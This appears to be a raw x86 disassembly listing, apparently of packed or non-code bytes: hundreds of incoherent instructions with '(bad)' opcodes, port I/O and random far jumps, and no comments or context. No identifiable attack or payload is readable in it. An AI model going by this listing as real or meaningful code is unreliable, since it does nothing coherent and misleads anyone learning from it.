  41aac4:	add    al,0x22
  41aac6:	push   esp
  41aac7:	lea    edx,[ebp-0x37629113]
  41aacd:	cmc    
  41aace:	icebp  
  41aacf:	imul   esp,edx,0xd
  41aad2:	mov    BYTE PTR [ebx],ah
  41aad4:	lock sub eax,0x766a8c46
  41aada:	rol    DWORD PTR [eax],1
  41aadc:	pop    eax
  41aadd:	jecxz  0x41aa90
  41aadf:	lods   al,BYTE PTR ds:[esi]
  41aae0:	xchg   ebp,eax
  41aae1:	fld    TBYTE PTR [ebx+0xbb334eb]
  41aae7:	push   edx
  41aae8:	dec    ecx
  41aae9:	push   ecx
  41aaea:	sub    al,0x69
  41aaec:	cmp    DWORD PTR [esi+0x5a],edx
  41aaef:	mov    edx,0x1bb33579
  41aaf4:	lods   al,BYTE PTR ds:[esi]
  41aaf5:	mov    al,ds:0x50663a32
  41aafa:	shl    DWORD PTR [edi],1
  41aafc:	div    BYTE PTR [ebx-0x4d950dea]
  41ab02:	imul   esi,DWORD PTR [ecx-0x44],0x6c6b0655
  41ab09:	sbb    al,0x26
  41ab0b:	pop    ds
  41ab0c:	or     al,0x18
  41ab0e:	mov    DWORD PTR [esi+edx*8+0x1],esi
  41ab12:	cmp    eax,0xd63e96b4
  41ab17:	add    DWORD PTR [ecx-0x5b],esp
  41ab1a:	adc    BYTE PTR [edi-0x39],dh
  41ab1d:	call   0xd58ee154
  41ab22:	xchg   edi,eax
  41ab23:	add    BYTE PTR [eax+eax*1+0x2a],al
  41ab27:	(bad)  
  41ab29:	sub    al,0x68
  41ab2b:	pushf  
  41ab2c:	pop    es
  41ab2d:	out    0xb8,eax
  41ab2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab30:	int3   
  41ab31:	pop    ebp
  41ab32:	data16 arpl WORD PTR [ebx],bp
  41ab35:	xchg   esp,eax
  41ab36:	test   DWORD PTR [esi+0x748651eb],edi
  41ab3c:	push   0x4b
  41ab3e:	xchg   ecx,eax
  41ab3f:	mov    esi,0xcfe3c810
  41ab44:	test   BYTE PTR [esi+0x4e],ch
  41ab47:	or     ebp,DWORD PTR ss:[eax]
  41ab4a:	mov    ds:0xe5f861d8,eax
  41ab4f:	(bad)  [eax]
  41ab51:	lds    eax,FWORD PTR [ecx+eax*8-0x6]
  41ab55:	addr16 inc ebp
  41ab57:	xor    esi,DWORD PTR [eax-0x23]
  41ab5a:	out    dx,al
  41ab5b:	add    ebx,DWORD PTR [ebx]
  41ab5d:	test   DWORD PTR ds:0xc85ff8a5,ebp
  41ab63:	sbb    al,0x39
  41ab65:	mov    cl,0xa
  41ab67:	arpl   WORD PTR [eax-0x6e],si
  41ab6a:	jp     0x41ab5d
  41ab6c:	mov    edx,edx
  41ab6e:	in     al,dx
  41ab6f:	push   eax
  41ab70:	test   al,0x64
  41ab72:	ja     0x41abdb
  41ab74:	fsubr  QWORD PTR [edx+0x77]
  41ab77:	adc    al,0x2f
  41ab79:	cmp    dl,BYTE PTR [esi]
  41ab7b:	pusha  
  41ab7c:	in     al,dx
  41ab7d:	push   ds
  41ab7e:	stc    
  41ab7f:	xchg   ecx,eax
  41ab80:	loope  0x41abe6
  41ab82:	push   ebx
  41ab83:	mov    DWORD PTR [esi+0x2f],ebp
  41ab86:	sbb    dl,cl
  41ab88:	sahf   
  41ab89:	outs   dx,BYTE PTR gs:[esi]
  41ab8b:	xor    BYTE PTR [eax+ebx*8],cl
  41ab8e:	cmc    
  41ab8f:	sub    al,0xbd
  41ab91:	xor    eax,0x407e5bc4
  41ab96:	cmp    edx,DWORD PTR [ebp+0x61aa21bd]
  41ab9c:	dec    esi
  41ab9d:	xchg   edi,eax
  41ab9e:	icebp  
  41ab9f:	inc    ebx
  41aba0:	out    dx,eax
  41aba1:	and    ebp,DWORD PTR [edi+0x31004a57]
  41aba7:	loop   0x41abad
  41aba9:	xchg   edx,ecx
  41abab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abac:	jmp    0x41ab31
  41abae:	(bad)  
  41abaf:	(bad)  
  41abb0:	(bad)  
  41abb1:	jge    0x41ac0e
  41abb3:	fidiv  WORD PTR [edx+0x63]
  41abb6:	xor    BYTE PTR [eax-0x3a],dl
  41abb9:	mov    bl,0x76
  41abbb:	ja     0x41ab55
  41abbd:	dec    ecx
  41abbe:	inc    ebp
  41abbf:	xor    ebx,0x29a0f586
  41abc5:	mov    esp,0x8c45f4e8
  41abca:	jae    0x41ab67
  41abcc:	push   edx
  41abcd:	push   ss
  41abce:	mov    esi,0x1946394e
  41abd3:	push   0xffffff91
  41abd5:	adc    al,BYTE PTR [esi+0x3a]
  41abd8:	jl     0x41ab6b
  41abda:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41abdc:	add    BYTE PTR es:[esi+0x67],cl
  41abe0:	xlat   BYTE PTR ds:[ebx]
  41abe1:	dec    edi
  41abe2:	mov    edi,gs
  41abe4:	out    0xf4,al
  41abe6:	add    ecx,esi
  41abe8:	dec    edi
  41abe9:	leave  
  41abea:	loope  0x41ac32
  41abec:	test   DWORD PTR [ecx],0x6f0da2ed
  41abf2:	and    cl,BYTE PTR [ecx]
  41abf4:	push   esp
  41abf5:	mov    ah,dh
  41abf7:	aaa    
  41abf8:	aaa    
  41abf9:	pop    ss
  41abfa:	xor    dl,bh
  41abfc:	pop    ds
  41abfd:	mov    eax,0x8c88b7c8
  41ac02:	pop    esi
  41ac03:	mov    bh,0x12
  41ac05:	adc    eax,DWORD PTR [edx-0x38]
  41ac08:	cmp    esi,DWORD PTR [ebp-0x6b]
  41ac0b:	push   ss
  41ac0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac0d:	dec    ebx
  41ac0e:	xor    BYTE PTR [ecx-0x52],dh
  41ac11:	jp     0x41abd2
  41ac13:	add    DWORD PTR [edi+0x30126dab],eax
  41ac19:	dec    esi
  41ac1a:	jnp    0x41ac6b
  41ac1c:	push   0xe323077e
  41ac21:	mov    esp,0x708e4ec2
  41ac26:	dec    ebp
  41ac27:	out    0xcf,al
  41ac29:	and    dl,BYTE PTR [eax-0x3d]
  41ac2c:	cmc    
  41ac2d:	mov    ah,0xec
  41ac2f:	dec    edx
  41ac30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac31:	add    al,0x4c
  41ac33:	ja     0x41abf0
  41ac35:	rol    BYTE PTR [edx-0x1a45cc84],0xef
  41ac3c:	cmp    bl,BYTE PTR ss:[edx+0x48e457eb]
  41ac43:	cmp    ah,dl
  41ac45:	cmp    al,0xe9
  41ac47:	lahf   
  41ac48:	test   eax,0x68f49649
  41ac4d:	jno    0x41abd3
  41ac4f:	fadd   QWORD PTR [ebx+0x4594634e]
  41ac55:	fstp   QWORD PTR ds:0xf4f3f8a0
  41ac5b:	xor    BYTE PTR [ecx+esi*8-0x56],cl
  41ac5f:	mov    esp,0x5ff04c05
  41ac64:	cld    
  41ac65:	ret    
  41ac66:	test   BYTE PTR [ecx-0x4a],dl
  41ac69:	and    eax,0xd3511f14
  41ac6e:	xor    DWORD PTR [eax+0x9ed9b4f],ecx
  41ac74:	retf   0xdd3f
  41ac77:	dec    ecx
  41ac78:	mov    ah,0x97
  41ac7a:	lea    eax,[esi-0x643dda5]
  41ac80:	cwde   
  41ac81:	pop    ss
  41ac82:	pop    ebx
  41ac83:	cmp    bh,bl
  41ac85:	(bad)  
  41ac86:	in     eax,0xd
  41ac88:	(bad)
  41ac8c:	pfrcp  mm2,QWORD PTR [edx+ecx*2-0x3a]
  41ac92:	xchg   ecx,eax
  41ac93:	or     eax,0x443b20d9
  41ac98:	jne    0x41ac63
  41ac9a:	dec    eax
  41ac9b:	bnd jg 0x41acb0
  41ac9e:	fcomp  QWORD PTR [esi+0x1e]
  41aca1:	mov    dh,0x40
  41aca3:	fbstp  TBYTE PTR [eax]
  41aca5:	or     eax,0x33028eb5
  41acaa:	lods   eax,DWORD PTR ds:[esi]
  41acab:	call   0x7787:0xa3754f84
  41acb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acb3:	jge    0x41accf
  41acb5:	xor    edi,DWORD PTR [esi]
  41acb7:	in     eax,dx
  41acb8:	xchg   ebx,eax
  41acb9:	xor    BYTE PTR [eax],0x58
  41acbc:	inc    ecx
  41acbd:	pop    ds
  41acbe:	outs   dx,BYTE PTR ds:[esi]
  41acbf:	aaa    
  41acc0:	rcl    BYTE PTR [ecx-0xdc45f7f],0xf5
  41acc7:	clc    
  41acc8:	arpl   bx,cx
  41acca:	xor    eax,0xada348db
  41accf:	icebp  
  41acd0:	jmp    0x894673e7
  41acd5:	and    DWORD PTR [ecx+0x64],ebp
  41acd8:	jmp    0x9e86:0x80d7aaea
  41acdf:	enter  0xae88,0xf5
  41ace3:	in     al,0x42
  41ace5:	(bad)  [ebx-0x43]
  41ace8:	loope  0x41acd9
  41acea:	cmp    BYTE PTR [edx],bh
  41acec:	cmp    al,0x6b
  41acee:	das    
  41acef:	std    
  41acf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acf1:	lahf   
  41acf2:	dec    eax
  41acf3:	cdq    
  41acf4:	imul   BYTE PTR [ebp-0xe6c8488]
  41acfa:	mov    ebp,0x59f03aee
  41acff:	lds    ebp,FWORD PTR [ebp+0x70eda0bd]
  41ad05:	xchg   esi,eax
  41ad06:	pop    esp
  41ad07:	popa   
  41ad08:	mov    ebp,0xdc35ad9f
  41ad0d:	cmp    eax,DWORD PTR [ecx+0x26298f72]
  41ad13:	fcmovnbe st,st(5)
  41ad15:	jle    0x41aca6
  41ad17:	stos   BYTE PTR es:[edi],al
  41ad18:	adc    DWORD PTR [esi],0x22
  41ad1b:	pop    edi
  41ad1c:	xchg   ebp,eax
  41ad1d:	mov    bl,0xdc
  41ad1f:	jl     0x41acfd
  41ad21:	cdq    
  41ad22:	imul   ecx,DWORD PTR [ecx],0x1a632c7c
  41ad28:	int3   
  41ad29:	inc    edi
  41ad2a:	dec    ecx
  41ad2b:	sahf   
  41ad2c:	mov    ecx,0x7d0d9be1
  41ad31:	sbb    esp,DWORD PTR [ecx-0x1cd3e346]
  41ad37:	(bad)  
  41ad38:	loop   0x41acd4
  41ad3a:	loopne 0x41ad35
  41ad3c:	adc    al,0xca
  41ad3e:	js     0x41ad78
  41ad40:	shl    DWORD PTR [esi],0xc6
  41ad43:	(bad)  
  41ad45:	sub    BYTE PTR [edx+0x2b],bl
  41ad48:	xor    BYTE PTR [edx+0x1a12e8cb],bl
  41ad4e:	mov    cl,0x3c
  41ad50:	inc    eax
  41ad51:	icebp  
  41ad52:	cli    
  41ad53:	push   ss
  41ad54:	out    0x4a,al
  41ad56:	(bad)  
  41ad57:	mov    ds,edi
  41ad59:	xchg   ebx,eax
  41ad5a:	leave  
  41ad5b:	sub    eax,0xfdb3b346
  41ad60:	sbb    bl,BYTE PTR [ebx]
  41ad62:	jmp    0x6f7f:0x200cfee1
  41ad69:	mov    esp,DWORD PTR [esi+0x6e14e516]
  41ad6f:	push   0x39
  41ad71:	jg     0x41adc2
  41ad73:	ss test al,0x72
  41ad76:	add    eax,0x85a54949
  41ad7b:	(bad)  
  41ad7c:	cs int3 
  41ad7e:	mov    ds:0x294a361,eax
  41ad83:	sti    
  41ad84:	fstp   TBYTE PTR [ebp+ebp*2-0x4a07b090]
  41ad8b:	fmul   QWORD PTR [edx+ebx*1-0x51b02d2d]
  41ad92:	inc    ebp
  41ad93:	jge    0x41ad22
  41ad95:	mov    al,0x2a
  41ad97:	loop   0x41adc0
  41ad99:	js     0x41ad4f
  41ad9b:	out    dx,al
  41ad9c:	pop    edi
  41ad9d:	rcr    DWORD PTR [edx+edi*4-0x6a],1
  41ada1:	pop    ecx
  41ada2:	mov    eax,ds:0xf4c3a350
  41ada7:	push   esp
  41ada8:	adc    ebx,DWORD PTR [ebx+0x6a]
  41adab:	xchg   ecx,eax
  41adac:	cmp    BYTE PTR [edx+0x3cddac22],dh
  41adb2:	cmp    BYTE PTR [ebx+0x760518ac],cl
  41adb8:	pop    eax
  41adb9:	(bad)  
  41adbb:	jmp    0x41ad7b
  41adbd:	(bad)  
  41adbe:	sar    edx,1
  41adc0:	push   edx
  41adc1:	add    DWORD PTR [edi+esi*8+0x43],0xffffffc5
  41adc6:	pushf  
  41adc7:	nop
  41adc8:	aad    0x41
  41adca:	dec    ebx
  41adcb:	ja     0x41adb1
  41adcd:	arpl   WORD PTR [edx+0x43],di
  41add0:	repnz scas al,BYTE PTR es:[edi]
  41add2:	dec    esi
  41add3:	sub    dl,bl
  41add5:	ja     0x41adf6
  41add7:	pop    esi
  41add8:	push   esi
  41add9:	add    DWORD PTR [edi+0x6e],0x7e
  41addd:	pop    edi
  41adde:	dec    esi
  41addf:	test   BYTE PTR [eax-0x4b7d1c94],al
  41ade5:	push   eax
  41ade6:	mov    edx,0xb582390a
  41adeb:	mov    al,0x40
  41aded:	add    eax,0xe8676cf
  41adf2:	pop    ebp
  41adf3:	jecxz  0x41ae2b
  41adf5:	data16 cmp cl,BYTE PTR [edi]
  41adf8:	jne    0x41aded
  41adfa:	inc    edi
  41adfb:	jnp    0x41ad7e
  41adfd:	inc    esp
  41adfe:	push   0x95b5af1d
  41ae03:	jmp    0xa1b7ff40
  41ae08:	mov    ds:0x41939fd0,eax
  41ae0d:	out    dx,al
  41ae0e:	mov    eax,0xf12555d5
  41ae13:	in     al,dx
  41ae14:	jno    0x41ad9e
  41ae16:	or     ch,0x1f
  41ae19:	in     eax,dx
  41ae1a:	lahf   
  41ae1b:	xchg   DWORD PTR [esi+0x5f],ebx
  41ae1e:	ins    BYTE PTR es:[edi],dx
  41ae1f:	dec    eax
  41ae20:	pop    esi
  41ae21:	fwait
  41ae22:	retf   0x1d97
  41ae25:	add    eax,DWORD PTR [edx+0x60]
  41ae28:	mov    WORD PTR [edx+0x2c],cs
  41ae2b:	aam    0x39
  41ae2d:	and    eax,0xd244a681
  41ae32:	jb     0x41ae51
  41ae34:	lods   al,BYTE PTR ds:[esi]
  41ae35:	or     al,0xef
  41ae37:	jbe    0x41adf6
  41ae39:	test   BYTE PTR [esi],0x33
  41ae3c:	sub    eax,0x3e2ddd27
  41ae41:	or     DWORD PTR [edi],ebp
  41ae43:	push   0xfffffffa
  41ae45:	mov    bl,0x5b
  41ae47:	cmp    esp,0x8282f8b
  41ae4d:	mov    eax,0xa5ccea2f
  41ae52:	shl    DWORD PTR [edi-0xf],1
  41ae55:	das    
  41ae56:	bound  esp,QWORD PTR [ebx-0x58ff43ee]
  41ae5c:	outs   dx,BYTE PTR ds:[esi]
  41ae5d:	lods   al,BYTE PTR ds:[esi]
  41ae5e:	adc    cl,al
  41ae60:	stc    
  41ae61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae62:	es sub al,0x4d
  41ae65:	sub    al,0x48
  41ae67:	out    dx,al
  41ae68:	daa    
  41ae69:	or     eax,0x1b9e82c4
  41ae6e:	xchg   ebp,eax
  41ae6f:	xchg   ecx,eax
  41ae70:	int3   
  41ae71:	mov    eax,0xa76d24e0
  41ae76:	mov    bh,0x18
  41ae78:	cdq    
  41ae79:	and    cl,bl
  41ae7b:	in     eax,0x48
  41ae7d:	mov    ebp,0x1e5da5d5
  41ae82:	dec    eax
  41ae83:	and    dl,BYTE PTR ds:0xaf022ed1
  41ae89:	test   DWORD PTR [eax],eax
  41ae8b:	mov    esi,0x7b0c1434
  41ae90:	jae    0x41aeec
  41ae92:	mov    bl,0x13
  41ae94:	xchg   esi,eax
  41ae95:	mov    esp,0x68a37d0e
  41ae9a:	xor    ah,BYTE PTR [esi-0x66]
  41ae9d:	out    dx,al
  41ae9e:	into   
  41ae9f:	sbb    DWORD PTR [edi-0x7a701a97],ebx
  41aea5:	xlat   BYTE PTR ds:[ebx]
  41aea6:	xor    al,0xfa
  41aea8:	imul   DWORD PTR [eax+ebp*8+0x3a04dd3e]
  41aeaf:	call   0xb061:0x4821596f
  41aeb6:	mov    al,ds:0x6e611019
  41aebb:	int    0xfb
  41aebd:	mov    ebx,0x979140bc
  41aec2:	or     BYTE PTR [ebp-0x2488a483],cl
  41aec8:	test   eax,0x1a3cd00e
  41aecd:	xchg   ebx,eax
  41aece:	in     al,0x7
  41aed0:	sbb    eax,0xde5ad829
  41aed5:	(bad)  
  41aed6:	stc    
  41aed7:	mov    al,0x8c
  41aed9:	sub    DWORD PTR [ecx+0x6ebc9fe],eax
  41aedf:	cmp    dl,BYTE PTR [ebx-0x7d]
  41aee2:	ror    DWORD PTR [ecx],cl
  41aee4:	les    edi,FWORD PTR [ecx+0x6e]
  41aee7:	mov    ah,0x76
  41aee9:	mov    ch,0x40
  41aeeb:	add    BYTE PTR [edx],ch
  41aeed:	inc    ebx
  41aeee:	fcmovne st,st(1)
  41aef0:	stc    
  41aef1:	or     BYTE PTR [ebp-0x2b],dl
  41aef4:	das    
  41aef5:	pop    ebx
  41aef6:	mov    ebp,0xeb0d0196
  41aefb:	sbb    esi,0xffffff8a
  41aefe:	mov    esp,0xcf6f82b2
  41af03:	mov    esi,0xcac97d07
  41af08:	mov    ch,0xcf
  41af0a:	cld    
  41af0b:	push   0xcfc7a9d2
  41af10:	cs inc esp
  41af12:	mov    ebx,0xe232b29
  41af17:	jne    0x41af3d
  41af19:	mov    ah,0x78
  41af1b:	dec    ebx
  41af1c:	mov    ch,0x45
  41af1e:	loopne 0x41aeb4
  41af20:	clc    
  41af21:	pop    ebx
  41af22:	dec    esp
  41af23:	fdivr  QWORD PTR [edi+ebp*8]
  41af26:	je     0x41afa5
  41af28:	pop    esp
  41af29:	add    ebx,esi
  41af2b:	ss je  0x41aeb4
  41af2e:	repnz rcr DWORD PTR [ecx+0x685bcad4],cl
  41af35:	push   esp
  41af36:	and    cl,bl
  41af38:	lds    esp,FWORD PTR [ebp+0x46e6f95]
  41af3e:	clc    
  41af3f:	dec    edi
  41af40:	or     eax,0xdd22f0d0
  41af45:	push   0x53579bd2
  41af4a:	fcomp  st(1)
  41af4c:	cmp    dl,dl
  41af4e:	out    dx,eax
  41af4f:	sbb    DWORD PTR [esi+ebx*1-0x5a970202],0xffffffdf
  41af57:	dec    ecx
  41af58:	fidiv  WORD PTR [edi+0x5f16a3ae]
  41af5e:	jnp    0x41afd5
  41af60:	out    0xd0,al
  41af62:	dec    ebp
  41af63:	sub    eax,0xf8729f89
  41af68:	data16 or al,0x4d
  41af6b:	or     ah,BYTE PTR [edi]
  41af6d:	mov    ebp,0x3733452b
  41af72:	mov    al,ds:0x53d319a9
  41af77:	repnz ins DWORD PTR es:[edi],dx
  41af79:	dec    eax
  41af7a:	mov    edi,0x713da63b
  41af7f:	push   edx
  41af80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af81:	xor    DWORD PTR [ecx-0xb],ebx
  41af84:	fiadd  DWORD PTR [eax+0x23]
  41af87:	dec    ebx
  41af88:	or     eax,0xcf867dcc
  41af8d:	mov    ebx,0x2ba4bb92
  41af92:	jg     0x41aff7
  41af94:	shl    DWORD PTR [ebx-0x77],1
  41af97:	mov    ds:0x47c1e774,al
  41af9c:	std    
  41af9d:	mov    ah,0x44
  41af9f:	adc    DWORD PTR [edx-0x5f],0x17
  41afa3:	mov    al,ds:0x7e218f68
  41afa8:	jb     0x41af81
  41afaa:	sub    ebx,DWORD PTR [eax-0x54]
  41afad:	mov    cl,0xca
  41afaf:	or     DWORD PTR [edi],edx
  41afb1:	add    eax,0xa8fa7b8e
  41afb6:	jg     0x41af92
  41afb8:	int    0x32
  41afba:	push   ds
  41afbb:	xchg   esi,esi
  41afbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afbe:	push   esp
  41afbf:	ins    BYTE PTR es:[edi],dx
  41afc0:	cmp    eax,0x212cf4f3
  41afc5:	inc    ebx
  41afc6:	pop    ebx
  41afc7:	pusha  
  41afc8:	mov    ds:0xa6512e9e,al
  41afcd:	push   es
  41afce:	mov    ebp,0x8ce00902
  41afd3:	loopne 0x41af92
  41afd5:	push   edi
  41afd6:	xchg   edx,eax
  41afd7:	es push ds
  41afd9:	pushf  
  41afda:	mov    ch,0x96
  41afdc:	ror    BYTE PTR [edx+0x4611b2a8],cl
  41afe2:	sahf   
  41afe3:	ins    BYTE PTR es:[edi],dx
  41afe4:	add    eax,0xd7c01fc6
  41afe9:	mov    edi,0x965c3fc
  41afee:	jg     0x41b05a
  41aff0:	(bad)  
  41aff1:	mov    esp,0x935b92f3
  41aff6:	mov    cs,ecx
  41aff8:	lods   al,BYTE PTR ds:[esi]
  41aff9:	push   edx
  41affa:	and    BYTE PTR [edx],dl
  41affc:	aas    
  41affd:	add    eax,0x8246e664
  41b002:	xchg   ecx,eax
  41b003:	push   edi
  41b004:	push   ds
  41b005:	xor    BYTE PTR [eax+0x74eeb9d2],al
  41b00b:	mov    esp,esi
  41b00d:	sbb    ah,bh
  41b00f:	xor    al,0x55
  41b011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b012:	cs retf 
  41b014:	pop    ecx
  41b015:	adc    eax,0x7f84f657
  41b01a:	push   esi
  41b01b:	inc    esp
  41b01c:	xchg   DWORD PTR [edx+0x7b8ed613],ebx
  41b022:	ins    DWORD PTR es:[edi],dx
  41b023:	jg     0x41afb4
  41b025:	adc    al,BYTE PTR [ebx+edx*1+0x50d9db19]
  41b02c:	mov    ds:0xdf761078,eax
  41b031:	push   ecx
  41b032:	cmp    DWORD PTR [ebx-0x58a96135],ebx
  41b038:	jne    0x41afe8
  41b03a:	aaa    
  41b03b:	push   ds
  41b03c:	and    DWORD PTR [esi-0x21],esi
  41b03f:	repnz lock das 
  41b042:	in     eax,dx
  41b043:	xor    esp,DWORD PTR [edi+0xb2794dd]
  41b049:	or     BYTE PTR [ebx+0x33],bl
  41b04c:	sub    ch,BYTE PTR [eax+0x1b2d2d1e]
  41b052:	jns    0x41b057
  41b054:	aad    0xbd
  41b056:	mov    ah,0xb4
  41b058:	aam    0x7a
  41b05a:	xor    al,0xdd
  41b05c:	mov    ch,0x2b
  41b05e:	fidivr DWORD PTR [ebx]
  41b060:	rol    DWORD PTR ds:0x9ecb5d15,cl
  41b066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b067:	inc    edx
  41b068:	test   eax,ebp
  41b06a:	xor    BYTE PTR [edi+0x140cc611],ah
  41b070:	mov    esp,0xcd00ed9e
  41b075:	sub    BYTE PTR [ecx+0x32],dl
  41b078:	pop    ds
  41b079:	in     al,0x35
  41b07b:	pop    edx
  41b07c:	out    0x86,al
  41b07e:	jl     0x41b063
  41b080:	fisttp DWORD PTR [ebx+0x6bbb2786]
  41b086:	outs   dx,DWORD PTR ds:[esi]
  41b087:	push   esi
  41b088:	dec    ebp
  41b089:	aas    
  41b08a:	repz leave 
  41b08c:	dec    esi
  41b08d:	adc    cl,dl
  41b08f:	test   eax,0x53fa3a8d
  41b094:	loop   0x41b0c7
  41b096:	call   0xe748:0xaed74777
  41b09d:	aam    0xaf
  41b09f:	mov    WORD PTR [edx],gs
  41b0a1:	mov    cl,0xcb
  41b0a3:	dec    esp
  41b0a4:	xchg   ebx,eax
  41b0a5:	clc    
  41b0a6:	(bad)  
  41b0a7:	loop   0x41b0c6
  41b0a9:	ins    DWORD PTR es:[edi],dx
  41b0aa:	lds    edi,FWORD PTR ds:0x24fef94f
  41b0b0:	test   al,0x59
  41b0b2:	hlt    
  41b0b3:	mov    dl,0xf3
  41b0b5:	xor    al,0x85
  41b0b7:	sbb    BYTE PTR [edx],ch
  41b0b9:	mov    ch,0x5b
  41b0bb:	and    eax,0x74657d7b
  41b0c0:	ror    esp,cl
  41b0c2:	mov    al,ds:0x600f2ed7
  41b0c7:	mov    ds:0x2aa5febf,al
  41b0cc:	sub    eax,0xa35985a0
  41b0d1:	mov    al,0x40
  41b0d3:	data16 stc 
  41b0d5:	icebp  
  41b0d6:	adc    al,0xd5
  41b0d8:	pop    ss
  41b0d9:	cmp    bh,BYTE PTR [edi+0x773053c0]
  41b0df:	xchg   BYTE PTR [edi*2-0x45660d0d],bh
  41b0e6:	fstp   TBYTE PTR fs:[esi-0x6da26517]
  41b0ed:	xor    al,0x8b
  41b0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0f0:	ja     0x41b14a
  41b0f2:	hlt    
  41b0f3:	rol    BYTE PTR [esi-0x20a99e54],cl
  41b0f9:	(bad)  
  41b0fa:	paddw  mm7,QWORD PTR ds:0x2aa7db94
  41b101:	xchg   edi,eax
  41b102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b103:	or     esi,DWORD PTR [ecx+0x1ddef0d3]
  41b109:	lea    ebx,[edi-0x36]
  41b10c:	(bad)  
  41b10d:	xchg   ebp,eax
  41b10e:	inc    ecx
  41b10f:	mov    dh,BYTE PTR [edi]
  41b111:	jmp    0x41b15b
  41b113:	mov    ecx,esi
  41b115:	ins    BYTE PTR es:[edi],dx
  41b116:	in     eax,dx
  41b117:	bound  ecx,QWORD PTR [edi]
  41b119:	pop    es
  41b11a:	jge    0x41b0d0
  41b11c:	pop    ebx
  41b11d:	adc    ebx,edi
  41b11f:	fs mov ebx,0xe951be72
  41b125:	mov    esi,0xae63e14
  41b12a:	mov    ch,0xdb
  41b12c:	jmp    0x3f15ad87
  41b131:	outs   dx,BYTE PTR ds:[esi]
  41b132:	and    BYTE PTR [ecx-0x4a],0x1d
  41b136:	in     eax,0x25
  41b138:	inc    ebp
  41b139:	jmp    0xca8e:0xf054872d
  41b140:	xor    BYTE PTR [edx],al
  41b142:	ror    DWORD PTR [edx-0x559dbf43],cl
  41b148:	add    BYTE PTR ss:[edx-0x15663622],bh
  41b14f:	jmp    0x41b1c8
  41b151:	xor    DWORD PTR [eax+0x438b2569],edi
  41b157:	add    BYTE PTR [esi-0x16],ah
  41b15a:	pop    edi
  41b15b:	ror    DWORD PTR [eax+edx*2-0x2fea8cf6],0xd0
  41b163:	lods   eax,DWORD PTR ds:[esi]
  41b164:	jle    0x41b1a7
  41b166:	dec    ecx
  41b167:	clc    
  41b168:	pop    edi
  41b169:	adc    cl,BYTE PTR [esi+0x5b]
  41b16c:	iret   
  41b16d:	xchg   esi,eax
  41b16f:	pop    esp
  41b170:	mov    al,BYTE PTR [eax]
  41b172:	sub    eax,0x8be1d264
  41b177:	pop    ds
  41b178:	cmp    ecx,DWORD PTR [eax]
  41b17a:	xor    DWORD PTR [edi],0x22
  41b17d:	cdq    
  41b17e:	xor    bh,0x41
  41b181:	push   eax
  41b182:	pop    esi
  41b183:	mov    edx,DWORD PTR [ebp-0x6b70236e]
  41b189:	cmovs  eax,DWORD PTR [edx-0x509dc1b8]
  41b190:	xchg   ecx,eax
  41b191:	pop    ds
  41b192:	push   edi
  41b193:	loopne 0x41b1cf
  41b195:	lock leave 
  41b197:	loop   0x41b20e
  41b199:	in     al,0x11
  41b19b:	data16 or al,BYTE PTR [ebp+0x45152ac2]
  41b1a2:	push   ds
  41b1a3:	mov    esi,0xc672a238
  41b1a8:	mov    ebp,0xa91fafff
  41b1ad:	mov    ebp,0x42144b19
  41b1b2:	mov    ds:0x2753bdf0,al
  41b1b7:	(bad)  
  41b1b8:	xchg   edx,eax
  41b1b9:	jle    0x41b13b
  41b1bb:	ret    
  41b1bc:	sub    edi,DWORD PTR [esi+0x49317066]
  41b1c2:	dec    edi
  41b1c3:	jge    0x41b1c0
  41b1c5:	in     eax,0x2d
  41b1c7:	fnstenv [edi+0x59]
  41b1ca:	adc    DWORD PTR ds:0xbd3ed313,edx
  41b1d0:	aam    0x29
  41b1d2:	js     0x41b164
  41b1d4:	xchg   esp,eax
  41b1d5:	stos   BYTE PTR es:[edi],al
  41b1d6:	push   edx
  41b1d7:	add    DWORD PTR [esi+0x257959a1],0xd3a84920
  41b1e1:	cld    
  41b1e2:	push   ds
  41b1e3:	popf   
  41b1e4:	inc    ecx
  41b1e5:	sub    dl,BYTE PTR [edx]
  41b1e7:	icebp  
  41b1e8:	cmc    
  41b1e9:	xchg   BYTE PTR [edi+0x6a1ae910],ah
  41b1ef:	adc    ch,BYTE PTR [eax+0x6b]
  41b1f2:	push   ss
  41b1f3:	retf   0x726
  41b1f6:	test   ah,dh
  41b1f8:	addr16 jmp 0x41b268
  41b1fb:	xchg   esi,eax
  41b1fc:	mov    ds:0x9ba75c4d,al
  41b201:	shr    DWORD PTR [ebx],cl
  41b203:	arpl   WORD PTR [ecx-0x289feac],bx
  41b209:	enter  0x8d67,0x70
  41b20d:	or     edi,eax
  41b20f:	outs   dx,BYTE PTR ds:[esi]
  41b210:	hlt    
  41b211:	ins    DWORD PTR es:[edi],dx
  41b212:	sbb    BYTE PTR [ebp-0x48],dh
  41b215:	scas   eax,DWORD PTR es:[edi]
  41b216:	ret    0x146e
  41b219:	clc    
  41b21a:	call   0x60ee33ab
  41b21f:	add    al,0x27
  41b221:	pop    ss
  41b222:	jp     0x41b20f
  41b224:	fld    QWORD PTR [esp+ebp*4-0x17292058]
  41b22b:	in     eax,0x89
  41b22d:	mov    eax,ds:0x24381fc8
  41b232:	push   eax
  41b233:	or     eax,DWORD PTR [edi+eax*2-0x1b21aa45]
  41b23a:	or     eax,0x3a5a12ec
  41b23f:	dec    ebp
  41b240:	mov    bl,0x18
  41b242:	enter  0x27e9,0x25
  41b246:	mov    bl,0x13
  41b248:	or     bl,BYTE PTR [eax+0x75]
  41b24b:	iret   
  41b24c:	cmovnp esi,DWORD PTR [ebx+edi*2+0x3]
  41b251:	pop    edx
  41b252:	mov    bh,0x89
  41b254:	jl     0x41b2bf
  41b256:	xchg   ebp,eax
  41b257:	xchg   esp,eax
